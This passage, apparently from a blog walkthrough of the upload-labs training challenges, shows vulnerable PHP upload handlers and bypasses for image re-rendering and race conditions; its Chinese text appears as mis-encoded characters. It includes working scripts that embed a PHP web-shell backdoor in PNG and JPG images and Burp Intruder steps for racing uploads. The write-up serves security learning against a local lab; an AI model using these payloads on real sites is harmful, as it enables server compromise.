class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v15">ç»•è¿‡æ–¹å¼</h4>
<p>ç»•è¿‡æ€è·¯ï¼šå¯¹æ¯”ä¸Šä¼ å‰å’Œä¸Šä¼ åçš„å›¾ç‰‡çš„å·®å¼‚ï¼Œæ‰¾åˆ°ç›¸åŒæ•°æ®åŒæ—¶åˆæ˜¯éå›¾ç‰‡æ•°æ®åŒºçš„åœ°æ–¹ï¼Œåœ¨åœ¨ï¼Œæ­¤å¤„å†™å…¥æ¶æ„ä»£ç ã€‚ ä¸åŒå›¾åƒç±»å‹çš„æ’å…¥æ–¹å¼æœ‰åŒºåˆ«ã€‚</p>
<h5 id="GIF">GIF</h5>
<p>GIFäºŒæ¬¡æ¸²æŸ“ç»•è¿‡è¯´æ˜¯æœ€ç®€å•çš„ï¼Œå°†æºæ–‡ä»¶å’ŒäºŒæ¬¡æ¸²æŸ“è¿‡çš„æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œæ‰¾å‡ºæºæ–‡ä»¶ä¸­æ²¡æœ‰è¢«ä¿®æ”¹çš„é‚£æ®µåŒºåŸŸï¼Œåœ¨é‚£æ®µåŒºåŸŸå†™å…¥phpä»£ç å³å¯ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202140626.png" alt=""></p>
<p>ä¿å­˜ä¹‹åï¼Œä¸Šä¼ è¯¥ä¿®æ”¹åçš„å›¾ç‰‡ï¼Œèƒ½å¤ŸæˆåŠŸåˆ©ç”¨ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202140824.png" alt=""></p>
<h5 id="PNG">PNG</h5>
<p>pngå’Œjpgå½“ç„¶æ²¡æœ‰gifè¿™ä¹ˆç®€å•ã€‚è¿™é‡Œæˆ‘ä¹Ÿä¸ç»†åˆ†æäº†(åˆ†æä¸æ¥~~)<br>
ç›´æ¥è®°ä¸ªæ–¹æ³•,å°†phpä»£ç å†™å…¥IDATæ•°æ®å—ã€‚<br>
ç”¨å›½å¤–å¤§ç‰›çš„è„šæœ¬ï¼Œç›®çš„æ˜¯å‘PNGå›¾ç‰‡çš„IDATæ•°æ®å—ä¸­æ’å…¥PHPåé—¨ä»£ç <code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code> ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è¿è¡Œè¯¥è„šæœ¬ç”Ÿæˆ1.pngä¸Šä¼ å³å¯ã€‚</p>
<h5 id="JPG">JPG</h5>
<p>JPGå›¾ç‰‡ä¹Ÿä½¿ç”¨è„šæœ¬æ¥ç”Ÿæˆï¼Œæ ¹æ®å…·ä½“æƒ…å†µæ¥æ›´æ”¹<code>miniPayload</code>çš„å€¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<ol>
<li>å…ˆå°†ä¸€å¼ æ­£å¸¸çš„jpgå›¾ç‰‡ä¸Šä¼ ï¼Œä¸Šä¼ åå°†æœåŠ¡å™¨å­˜å‚¨çš„äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡ä¿å­˜ä¸‹æ¥ã€‚</li>
<li>å°†ä¿å­˜ä¸‹æ¥ç»è¿‡æœåŠ¡å™¨äºŒæ¬¡æ¸²æŸ“çš„é‚£å¼ jpgå›¾ç‰‡ï¼Œç”¨æ­¤è„šæœ¬è¿›è¡Œå¤„ç†ç”Ÿæˆpayload.jpg</li>
<li>ç„¶åå†ä¸Šä¼ payload.jpg</li>
</ol>
<h3 id="Pass-17-åˆ©ç”¨ç«äº‰æ¡ä»¶ç»•è¿‡">Pass-17 åˆ©ç”¨ç«äº‰æ¡ä»¶ç»•è¿‡</h3>
<h4 id="ä»£ç -v16">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v16">ç»•è¿‡æ–¹å¼</h4>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°æ˜¯ä¸ªæ¡ä»¶ç«äº‰ï¼Œä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ä¼šè¢«é‡å‘½åï¼Œè€Œä¸Šä¼ å¤±è´¥çš„æ–‡ä»¶ä¼šå…ˆä¿å­˜åœ¨uploadç›®å½•ä¸­ã€ç„¶åå†è°ƒç”¨unlink()åˆ é™¤è¯¥ä¸åˆæ³•çš„ä¸Šä¼ æ–‡ä»¶ï¼š</p>
<p>ä»£ç å­˜åœ¨æ¡ä»¶ç«äº‰é—®é¢˜ï¼Œéæ³•æ–‡ä»¶ä¸Šä¼ åä¼šå…ˆä¿å­˜åœ¨uploadç›®å½•ä¸­ï¼Œç„¶åå†è°ƒç”¨unlink()å‡½æ•°æ¥åˆ é™¤ï¼Œåœ¨è¿™ä¸­é—´çš„æ—¶é—´å·®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸æ–­ä¸Šä¼ å’Œè®¿é—®éæ³•çš„PHPæ–‡ä»¶ï¼Œé€Ÿåº¦å¤Ÿå¿«æ—¶å°±èƒ½è§¦å‘æˆåŠŸã€‚</p>
<p>ç”¨burpå¼€å¯ä¸¤ä¸ªintruderæ¨¡å—ï¼Œä¸€ä¸ªç”¨äºé‡å¤ä¸Šä¼ ï¼Œå¦ä¸€ä¸ªç”¨äºé‡å¤è®¿é—®ã€‚</p>
<p>Step1ï¼š å…ˆè®¾ç½®ä¸Šä¼ è¯·æ±‚ï¼ŒBurpæ‹¦æˆªåˆ°ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…åå‘é€åˆ°Intruderæ¨¡å—ï¼Œå› ä¸ºæ­¤å¤„æ²¡æœ‰ä»€ä¹ˆå‚æ•°éœ€è¦çˆ†ç ´ï¼Œåªæ˜¯éœ€è¦é‡å¤å‘èµ·è¯·æ±‚ï¼Œæ‰€ä»¥payloadè®¾ç½®ä¸ºNull payloads,è®¾ç½®è®¿é—®æ¬¡æ•°5000æ¬¡ï¼Œçº¿ç¨‹50ä¸ªã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202152822.png" alt=""></p>
<p>Step2ï¼šæ¥ä¸‹æ¥è®¾ç½®è®¿é—®è¯·æ±‚ï¼Œæµè§ˆå™¨æ„é€ è¯·æ±‚urlï¼š<code>http://127.0.0.1/upload-labs-master/upload/miracle778.php</code>,è¿›è¡Œè®¿é—®ï¼Œç„¶åç”¨burpæŠ“åŒ…åå‘é€è‡³intruderæ¨¡å—ï¼Œè®¾ç½®payloadï¼Œè¿™ä¸€æ­¥å’Œä¸Šä¼ è¯·æ±‚è®¾ç½®å·®ä¸å¤šï¼Œéƒ½æ˜¯Null payloadsã€5000æ¬¡ã€50ä¸ªçº¿ç¨‹ã€‚</p>
<p>Step3ï¼šè®¾ç½®å¥½ä¸¤ä¸ªæ¨¡å—ååŒæ—¶å¯åŠ¨ï¼Œè§‚å¯Ÿç»“æœï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„phpä»£ç æ˜¯<code>phpinfo();</code>,æ‰€ä»¥å¦‚æœè®¿é—®æˆåŠŸçš„è¯ï¼Œä¼šè¿”å›phpçš„é…ç½®ä¿¡æ¯ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202153511.png" alt=""></p>
<h3 id="Pass-18-åˆ©ç”¨ç«äº‰æ¡ä»¶-è§£ææ¼æ´ç»•è¿‡">Pass-18 åˆ©ç”¨ç«äº‰æ¡ä»¶+è§£ææ¼æ´ç»•è¿‡</h3>
